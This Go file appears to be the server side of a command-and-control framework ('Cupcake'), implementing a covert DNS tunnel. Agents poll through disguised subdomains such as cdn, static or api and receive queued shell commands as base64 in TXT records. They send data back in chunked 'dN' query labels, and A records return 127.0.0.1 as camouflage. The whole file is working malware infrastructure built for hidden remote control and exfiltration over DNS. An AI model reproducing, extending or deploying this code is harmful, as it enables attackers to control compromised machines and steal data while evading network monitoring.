package services

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"log"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
)

// DNS tunnel state aligned with Client transport/dns.rs:
//   poll:  <rot>.<tag>.<zone>     → TXT "alive" | "cmd:<b64>"
//   up:    dN.<chunk>.<tag>.<zone> → TXT "ok"
// tag = hex(sha256(uuid)[:6])

type dnsAgentState struct {
	UUID      string
	LastSeen  time.Time
	Pending   []string // FIFO command payloads (raw shell strings or JSON)
	Uplink    []byte
	mu        sync.Mutex
}

var (
	dnsAgents sync.Map // tag -> *dnsAgentState
)

// AgentDNSTag matches client DnsTransport::agent_tag
func AgentDNSTag(uuid string) string {
	h := sha256.Sum256([]byte(uuid))
	return hex.EncodeToString(h[:6])
}

// DNSEnqueueCommand queues a command for a DNS-mode agent (by UUID).
func DNSEnqueueCommand(uuid, command string) {
	if uuid == "" || command == "" {
		return
	}
	tag := AgentDNSTag(uuid)
	val, _ := dnsAgents.LoadOrStore(tag, &dnsAgentState{UUID: uuid})
	st := val.(*dnsAgentState)
	st.mu.Lock()
	st.Pending = append(st.Pending, command)
	st.LastSeen = time.Now()
	st.mu.Unlock()
	log.Printf("[DNS] enqueued cmd for %s tag=%s", uuid, tag)
}

// DNSRegisterTouch updates last-seen / binds uuid to tag.
func DNSRegisterTouch(uuid string) {
	if uuid == "" {
		return
	}
	tag := AgentDNSTag(uuid)
	val, _ := dnsAgents.LoadOrStore(tag, &dnsAgentState{UUID: uuid})
	st := val.(*dnsAgentState)
	st.mu.Lock()
	st.UUID = uuid
	st.LastSeen = time.Now()
	st.mu.Unlock()
}

// FormatDNSTxtAnswer builds TXT body for a query name (lowercased FQDN without trailing rules applied by caller).
// Exported for unit tests.
func FormatDNSTxtAnswer(qName string) string {
	name := strings.TrimSuffix(strings.ToLower(qName), ".")
	labels := strings.Split(name, ".")
	if len(labels) < 2 {
		return "alive"
	}

	// Legacy: ping.<uuid-or-tag>.domain...
	if labels[0] == "ping" {
		if len(labels) >= 2 {
			touchTag(labels[1])
		}
		return popOrAlive(labels[1])
	}

	// Uplink: dN.<chunk>.<tag>....
	if len(labels[0]) >= 2 && labels[0][0] == 'd' && labels[0][1] >= '0' && labels[0][1] <= '9' {
		if len(labels) >= 3 {
			chunk := labels[1]
			tag := labels[2]
			appendUplink(tag, chunk)
			return "ok"
		}
		return "ok"
	}

	// Poll: <rot>.<tag>.zone  (rot is short label like cdn, static, api)
	if len(labels) >= 2 {
		tag := labels[1]
		// Heuristic: tag is 12 hex chars
		if isHexTag(tag) {
			touchTag(tag)
			return popOrAlive(tag)
		}
		// tag might be at labels[0] if single-label quirks — try labels[0]
		if isHexTag(labels[0]) {
			touchTag(labels[0])
			return popOrAlive(labels[0])
		}
	}
	return "alive"
}

func isHexTag(s string) bool {
	if len(s) != 12 {
		return false
	}
	for _, c := range s {
		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f')) {
			return false
		}
	}
	return true
}

func touchTag(tag string) {
	if v, ok := dnsAgents.Load(tag); ok {
		st := v.(*dnsAgentState)
		st.mu.Lock()
		st.LastSeen = time.Now()
		st.mu.Unlock()
	} else {
		dnsAgents.Store(tag, &dnsAgentState{LastSeen: time.Now()})
	}
}

func popOrAlive(tag string) string {
	v, ok := dnsAgents.Load(tag)
	if !ok {
		return "alive"
	}
	st := v.(*dnsAgentState)
	st.mu.Lock()
	defer st.mu.Unlock()
	st.LastSeen = time.Now()
	if len(st.Pending) == 0 {
		return "alive"
	}
	cmd := st.Pending[0]
	st.Pending = st.Pending[1:]
	b64 := base64.StdEncoding.EncodeToString([]byte(cmd))
	return "cmd:" + b64
}

func appendUplink(tag, chunk string) {
	v, _ := dnsAgents.LoadOrStore(tag, &dnsAgentState{})
	st := v.(*dnsAgentState)
	st.mu.Lock()
	st.Uplink = append(st.Uplink, []byte(chunk)...)
	// Cap uplink buffer
	if len(st.Uplink) > 256*1024 {
		st.Uplink = st.Uplink[len(st.Uplink)-128*1024:]
	}
	st.LastSeen = time.Now()
	st.mu.Unlock()
}

// HandleDNSQuery is the miekg/dns handler for Cupcake DNS listeners.
func HandleDNSQuery(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Compress = false
	m.Authoritative = true

	if r.Opcode != dns.OpcodeQuery {
		_ = w.WriteMsg(m)
		return
	}

	for _, q := range m.Question {
		switch q.Qtype {
		case dns.TypeTXT:
			txt := FormatDNSTxtAnswer(q.Name)
			// Escape quotes in TXT
			txt = strings.ReplaceAll(txt, "\"", "'")
			rr, err := dns.NewRR(fmt.Sprintf("%s 30 IN TXT \"%s\"", q.Name, txt))
			if err == nil {
				m.Answer = append(m.Answer, rr)
			}
		case dns.TypeA:
			// Optional: return 127.0.0.1 for camouflage
			rr, err := dns.NewRR(fmt.Sprintf("%s 30 IN A 127.0.0.1", q.Name))
			if err == nil {
				m.Answer = append(m.Answer, rr)
			}
		}
	}
	_ = w.WriteMsg(m)
}
